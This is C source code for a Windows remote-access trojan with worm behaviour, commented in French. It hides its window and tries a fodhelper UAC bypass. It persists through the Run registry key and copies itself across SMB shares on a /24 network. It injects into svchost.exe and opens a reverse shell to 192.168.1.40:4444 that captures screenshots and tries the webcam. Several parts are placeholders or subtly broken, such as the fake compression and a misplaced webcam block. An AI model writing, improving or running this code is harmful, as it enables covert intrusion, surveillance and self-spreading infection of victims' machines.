#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <psapi.h>
#include <lm.h>
#include <mfidl.h>
#include <mfreadwrite.h>
#include <mfapi.h> // Include this for MF_VERSION and related constants
#include <shlobj.h>

#pragma comment(lib, "ws2_32")
#pragma comment(lib, "psapi")
#pragma comment(lib, "netapi32")
#pragma comment(lib, "mfplat")
#pragma comment(lib, "mfreadwrite")
#pragma comment(lib, "mfuuid")
#pragma comment(lib, "shell32")

#define SERVER_IP "192.168.1.40"
#define SERVER_PORT 4444
#define MAX_RETRIES 10
#define INITIAL_DELAY_MS 2000
#define PAYLOAD_NAME "svchost_helper.exe"
#define REG_RUN_KEY "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

// Obfuscation des chaînes
char *xor_string(const char *input) {
    char *output = strdup(input);
    for (int i = 0; output[i]; i++) output[i] ^= 0x5A;
    return output;
}

void deobfuscate(char *str) {
    for (int i = 0; str[i]; i++) str[i] ^= 0x5A;
}

// Compression JPEG simulée
void compress_jpeg(char *input, DWORD input_size, char **output, DWORD *output_size) {
    *output = input; // Placeholder : implémenter libjpeg pour une vraie compression
    *output_size = input_size;
}

// Fonction principale du reverse shell
DWORD WINAPI reverse_shell_thread(LPVOID lpParam) {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in server;
    char command[1024];
    int retry_count = 0, delay = INITIAL_DELAY_MS + (rand() % 1000);

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 1;

    while (retry_count < MAX_RETRIES) {
        sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        if (sock == INVALID_SOCKET) {
            WSACleanup();
            return 1;
        }

        char *ip = xor_string(SERVER_IP);
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = inet_addr(ip);
        server.sin_port = htons(SERVER_PORT);
        deobfuscate(ip);
        free(ip);

        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
            closesocket(sock);
            Sleep(delay);
            delay *= 2;
            retry_count++;
            continue;
        }
        break;
    }

    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    while (1) {
        int bytes_received = recv(sock, command, sizeof(command) - 1, 0);
        if (bytes_received <= 0) {
            closesocket(sock);
            Sleep(5000);
            return reverse_shell_thread(NULL); // Reconnexion
        }
        command[bytes_received] = '\0';

        if (strcmp(command, "screenshare") == 0) {
            HDC hScreenDC = GetDC(NULL);
            HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
            int width = GetSystemMetrics(SM_CXSCREEN);
            int height = GetSystemMetrics(SM_CYSCREEN);
            HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
            SelectObject(hMemoryDC, hBitmap);
            BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);

            BITMAPINFOHEADER bi = { sizeof(bi), width, height, 1, 24, BI_RGB, 0, 0, 0, 0, 0 };
            DWORD image_size = ((width * bi.biBitCount + 31) / 32) * 4 * height;
            char *buffer = (char *)malloc(image_size);
            GetDIBits(hMemoryDC, hBitmap, 0, height, buffer, (BITMAPINFO *)&bi, DIB_RGB_COLORS);

            char *compressed_buffer;
            DWORD compressed_size;
            compress_jpeg(buffer, image_size, &compressed_buffer, &compressed_size);

            send(sock, (char *)&bi, sizeof(bi), 0);
            send(sock, compressed_buffer, compressed_size, 0);

            free(buffer);
            DeleteObject(hBitmap);
            DeleteDC(hMemoryDC);
            ReleaseDC(NULL, hScreenDC);
        }
            MFStartup(MF_API_VERSION, MFSTARTUP_LITE); // Use MF_API_VERSION instead of MF_VERSION
            IMFMediaSource *pSource = NULL;
            IMFAttributes *pConfig = NULL;
            MFCreateAttributes(&pConfig, 1);

            // Dynamically load MFCreateDeviceSource from mf.dll
            typedef HRESULT (WINAPI *PFN_MFCreateDeviceSource)(IMFAttributes *pAttributes, IMFMediaSource **ppSource);
            PFN_MFCreateDeviceSource pMFCreateDeviceSource = NULL;
            HMODULE hMf = LoadLibraryA("mf.dll");
            if (hMf) {
                pMFCreateDeviceSource = (PFN_MFCreateDeviceSource)GetProcAddress(hMf, "MFCreateDeviceSource");
                if (pMFCreateDeviceSource != NULL) {
                    HRESULT hr = pMFCreateDeviceSource(pConfig, &pSource);
                    if (FAILED(hr)) {
                        // Handle error if needed
                    }
                }
                FreeLibrary(hMf);
            }

            // Placeholder : envoyer des frames MJPEG
            char dummy_frame[1024] = "MJPEG_frame_placeholder";
            send(sock, dummy_frame, sizeof(dummy_frame), 0);

        if (pSource) pSource->lpVtbl->Release(pSource);
        if (pConfig) pConfig->lpVtbl->Release(pConfig);
        MFShutdown();
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}

// Élévation de privilèges via UAC bypass (fodhelper.exe)
BOOL try_uac_bypass() {
    char cmd[MAX_PATH];
    sprintf_s(cmd, sizeof(cmd), "cmd.exe /c start fodhelper.exe");
    ShellExecuteA(NULL, "runas", cmd, NULL, NULL, SW_HIDE);
    Sleep(1000);
    return TRUE; // Simplifié
}

// Élévation via CVE-2024-38063 (IPv6, placeholder)
BOOL try_cve_2024_38063() {
    HANDLE hDevice = CreateFileA("\\\\.\\Ip6Fw", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) return FALSE;
    CloseHandle(hDevice);
    return TRUE;
}

// Persistance via le registre
void setup_persistence() {
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);

    char appdata_path[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata_path);
    strcat_s(appdata_path, sizeof(appdata_path), "\\" PAYLOAD_NAME);

    CopyFileA(exe_path, appdata_path, FALSE);

    HKEY hKey;
    if (RegOpenKeyA(HKEY_CURRENT_USER, REG_RUN_KEY, &hKey) == ERROR_SUCCESS) {
        char existing_value[MAX_PATH];
        DWORD size = sizeof(existing_value);
        if (RegQueryValueExA(hKey, "SystemHelper", NULL, NULL, (BYTE *)existing_value, &size) != ERROR_SUCCESS) {
            RegSetValueExA(hKey, "SystemHelper", 0, REG_SZ, (BYTE *)appdata_path, strlen(appdata_path) + 1);
        }
        RegCloseKey(hKey);
    }
}

// Propagation via faille SMB (inspirée de CVE-2020-0796)
void propagate_smb() {
    SHARE_INFO_1 *share_info;
    DWORD entries_read = 0, total_entries = 0;
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);

    for (int i = 1; i < 255; i++) {
        char target_ip[16];
        sprintf_s(target_ip, sizeof(target_ip), "192.168.1.%d", i);
        // Convert target_ip to wide string
        wchar_t wtarget_ip[16];
        MultiByteToWideChar(CP_ACP, 0, target_ip, -1, wtarget_ip, 16);
        if (NetShareEnum(wtarget_ip, 1, (LPBYTE *)&share_info, MAX_PREFERRED_LENGTH, &entries_read, &total_entries, NULL) == NERR_Success) {
            for (DWORD j = 0; j < entries_read; j++) {
                char target_path[MAX_PATH];
                sprintf_s(target_path, sizeof(target_path), "\\\\%s\\%s\\%s", target_ip, share_info[j].shi1_netname, PAYLOAD_NAME);
                if (CopyFileA(exe_path, target_path, FALSE)) {
                    char cmd[MAX_PATH];
                    sprintf_s(cmd, sizeof(cmd), "net use \\\\%s\\IPC$ && start %s", target_ip, target_path);
                    system(cmd);
                }
            }
            NetApiBufferFree(share_info);
        }
    }
}

// Trouver svchost.exe
DWORD find_svchost_pid() {
    DWORD processes[1024], cbNeeded, processCount;
    EnumProcesses(processes, sizeof(processes), &cbNeeded);
    processCount = cbNeeded / sizeof(DWORD);

    for (unsigned int i = 0; i < processCount; i++) {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
        if (hProcess) {
            char procName[MAX_PATH];
            if (GetModuleBaseNameA(hProcess, NULL, procName, sizeof(procName))) {
                if (_stricmp(procName, "svchost.exe") == 0) {
                    CloseHandle(hProcess);
                    return processes[i];
                }
            }
            CloseHandle(hProcess);
        }
    }
    return 0;
}

// Injecter le code
BOOL inject_code(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return FALSE;

    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, remoteMemory, reverse_shell_thread, 4096, NULL)) {
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Élévation de privilèges
    if (!try_uac_bypass() && !try_cve_2024_38063()) {
        fprintf(stderr, "Élévation de privilèges échouée.\n");
    }

    // Persistance
    setup_persistence();

    // Propagation
    propagate_smb();

    // Injection
    DWORD pid = find_svchost_pid();
    if (pid == 0) {
        fprintf(stderr, "Aucun svchost.exe trouvé.\n");
        return 1;
    }

    if (!inject_code(pid)) {
        fprintf(stderr, "Échec de l'injection.\n");
        return 1;
    }

    return 0;
}
